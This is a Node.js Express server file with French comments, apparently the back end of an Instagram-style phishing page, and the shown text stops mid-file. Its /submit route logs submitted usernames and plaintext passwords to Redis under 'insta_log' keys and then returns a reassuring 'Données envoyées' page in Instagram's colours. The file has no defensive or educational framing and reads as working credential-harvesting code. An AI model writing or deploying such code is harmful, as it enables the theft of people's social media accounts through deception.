const express = require('express');
const { Redis } = require('@upstash/redis');

const app = express();
const port = process.env.PORT || 3000;

// Connexion à Redis avec les variables d'environnement de Vercel
const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL,
  token: process.env.UPSTASH_REDIS_REST_TOKEN,
});

// Pour lire les données du formulaire
app.use(express.urlencoded({ extended: true }));
// Pour servir les fichiers statiques (HTML, images)
app.use(express.static('public'));

// Route pour la page d'accueil
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

// Route qui traite l'envoi du formulaire
app.post('/submit', async (req, res) => {
    const { username, password } = req.body;
    
    // Créer une clé unique pour chaque entrée
    const logKey = `insta_log:${Date.now()}`;

    try {
        // Sauvegarder les identifiants dans Redis
        await redis.hset(logKey, { username, password, date: new Date().toISOString() });
        console.log(`Sauvegardé: ${logKey}`);
    } catch (error) {
        console.error('Erreur Redis:', error);
    }

    // Afficher la page de confirmation
    res.send(`
        <!DOCTYPE html>
        <html lang="fr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Confirmation</title>
            <style>
                body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #fafafa; }
                .message-box { background-color: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; }
                h1 { color: #0095f6; }
                p { color: #8e8e8e; }
                a { color: #0095f6; text-decoration: none; font-weight: bold; }
            </style>
        </head>
        <body>
            <div class="message-box">
                <h1>Données envoyées</h1>
                <p>Vos informations ont été bien envoyées.</p>
            </div>
        </body>
        </html>
    `);
});

// Démarrage du serveur
app.listen(port, () => {
   